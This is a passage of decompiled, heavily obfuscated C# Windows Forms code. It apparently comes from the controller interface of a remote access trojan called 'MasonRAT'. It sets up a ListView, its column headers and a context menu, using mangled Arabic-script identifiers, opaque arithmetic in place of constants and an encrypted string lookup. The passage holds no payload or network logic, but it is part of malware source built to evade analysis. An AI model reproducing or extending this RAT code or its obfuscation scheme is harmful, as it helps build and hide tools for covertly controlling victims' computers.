    this.\u2694️MasonRAT\u270C\u0608ــح\u0609ڼـڞٸـئژـ.Width = (110215282 + (1704757662 | 1126080652) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 > (1703028236 << 1349848342) - 125224282 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 ? 830875038 - 830874716 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 : (1156364806 >> 1815687044) - 72272558 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Anchor = (AnchorStyles) (((-179366575 ^ 983920946 >> 1230377061) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) - ~((-314149276 ^ ~433866925) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.BackColor = Color.FromArgb(((12355 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 ^ (1701115827 > 1065320383 ? 101652364 : 135536485) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 >> (2006122276 > 1658421581 ? 1985126221 : -1648132335) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), 1633227036 + 410398263 % 1592491917 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0 - (-1993782539 - 257559507 % 2020608875 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1), (1747936194 - (598266779 | 882066883) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 ^ ((1063302188 > 1135904351 ? 1083838365 : 812878774) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) % (-1729618479 - (1026419602 << 1445684192) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1));
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.BorderStyle = BorderStyle.None;
    ListView.ColumnHeaderCollection columns = this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Columns;
    ColumnHeader[] values = new ColumnHeader[(122859207 + ~122859200 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0) + ((1023262142 > 1331736818 ? -1482753708 : 2109160191) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 >> 2092770200 - 869569435 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0];
    values[0] = this.\u2694️MasonRAT\u270C\u0608ــح\u0609ڼـڞٸـئژـ;
    values[1] = this.\u2694️MasonRAT\u270C\u0608ــ\u0609\u060Fـــ\u060Cڙڙ\u0020̍\u060F;
    values[((97779800 ^ -1566369504) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) + ((741643770 > 1333289000 ? 1980489229 : 1485366922) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0] = this.\u2694️MasonRAT\u270C\u060Fۜ\u060Fڼـ\u0609ـ\u0609ـۡٺـڟ\u060E\u0609\u060A;
    values[((-874851963 ^ 28774012 << 1873355769) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 > -1863228500 - (1401879707 >> 555182177) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 ? 224403991 - 224403987 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 : 2867690 - (1468255972 >> 1899530025) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)] = this.\u2694️MasonRAT\u270Cــگۡ\u060Dـحﻼـ\u0609ـ;
    values[(1764690829 - ~1779234369 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) - -(-1763303350 - 1780621845 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1] = this.\u2694️MasonRAT\u270Cــۜڙ\u0608ټط\u0608\u0020\u060C\u0020ڙ\u060Aـاط\u0609د\u060C\u060A;
    values[(639584241 + 510682107 % 1340637807 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) - (1133295438 + 16970905 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = this.\u2694️MasonRAT\u270C\u0020ـ\u060Fـةڞټ\u0608\u060B\u060B\u0609\u060A\u0609;
    values[((1912818489 > 676008105 ? 2060451411 : -1547698748) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) - (1725790475 - 1582976254 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 | 706194001 + 1219839984 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = this.\u2694️MasonRAT\u270C\u060Dۙــ\u060Dب\u060Aڠ̍ـئ;
    values[((896943341 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 > (-564784147 - (1761053630 | 1493316892) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) ? 1600947411 - 1600947402 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 : 623026966 - 623026959 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)] = this.\u2694️MasonRAT\u270Cـدڙﻋب\u060Eـۏْڙـۛۡـةﻻـ\u060C̍;
    values[(-2041417792 - (578735071 | 1459071215) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) - ((202187015 ^ 56599230 % 794813710) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)] = this.\u2694️MasonRAT\u270C\u060Dــ\u0608̍ڙ̍ح\u060Fـﻋﻋـۡ\u060B\u060F\u060Aـۚ\u060D;
    columns.AddRange(values);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.ContextMenuStrip = (ContextMenuStrip) this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 159), 11.25f, FontStyle.Regular, (GraphicsUnit) ((1001924646 + 1883756509 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0 ^ -1758228016 - (54140794 | 1881880776) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 << -1939106977 - 2013894694 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)), (byte) 0);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.FullRowSelect = true;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.HideSelection = false;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Location = new Point((-215272898 ^ 572992926 >> 1555241775) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 + (419059224 - 203803781 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, 43);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 160 /*0xA0*/);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.Size = new Size(((557831455 << 1574798354) - 1417411881 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0 ^ (331453941 ^ 331453948 % 1281729695) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1), 458);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SmallImageList = this.\u2694️MasonRAT\u270Cڦٺـ\u0608\u060Aـمۙﻋـةـۡ\u060Dــڙ;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.TabIndex = (-2009547919 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 - ~(-897852343 - 1387567030 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1);
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.UseCompatibleStateImageBehavior = false;
    this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.View = View.Details;
    this.\u2694️MasonRAT\u270C\u060Fۜ\u060Fڼـ\u0609ـ\u0609ـۡٺـڟ\u060E\u0609\u060A.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 161);
    this.\u2694️MasonRAT\u270C\u060Fۜ\u060Fڼـ\u0609ـ\u0609ـۡٺـڟ\u060E\u0609\u060A.Width = (2141982948 ^ 17) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 - (1621623585 + (1698687989 << 849420087) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) - 0 | -152233837 - ~1069479132 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0);
    this.\u2694️MasonRAT\u270Cــگۡ\u060Dـحﻼـ\u0609ـ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 162);
    this.\u2694️MasonRAT\u270Cــۜڙ\u0608ټط\u0608\u0020\u060C\u0020ڙ\u060Aـاط\u0609د\u060C\u060A.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 163);
    this.\u2694️MasonRAT\u270C\u0020ـ\u060Fـةڞټ\u0608\u060B\u060B\u0609\u060A\u0609.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 164);
    this.\u2694️MasonRAT\u270C\u060Dۙــ\u060Dب\u060Aڠ̍ـئ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 165);
    this.\u2694️MasonRAT\u270Cـدڙﻋب\u060Eـۏْڙـۛۡـةﻻـ\u060C̍.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 166);
    this.\u2694️MasonRAT\u270C\u060Dــ\u0608̍ڙ̍ح\u060Fـﻋﻋـۡ\u060B\u060F\u060Aـۚ\u060D.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 167);
    this.\u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد.BackColor = Color.FromArgb(1495934669 - 873275017 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 + -(359806912 + 1288274100 % 341807129 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0), (630115429 + ~630115402 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0 ^ (1653535016 ^ 1667198390 % 2057792122) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - 0 >> (856298589 + 893158940 % 1541067264 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, (948123362 + (970443726 | 876744714) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 > 27624332 + (979400942 | 382059949) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0 ? 1913257992 % 364034366 - 93086120 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 : -976892388 - ~976892443 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0));
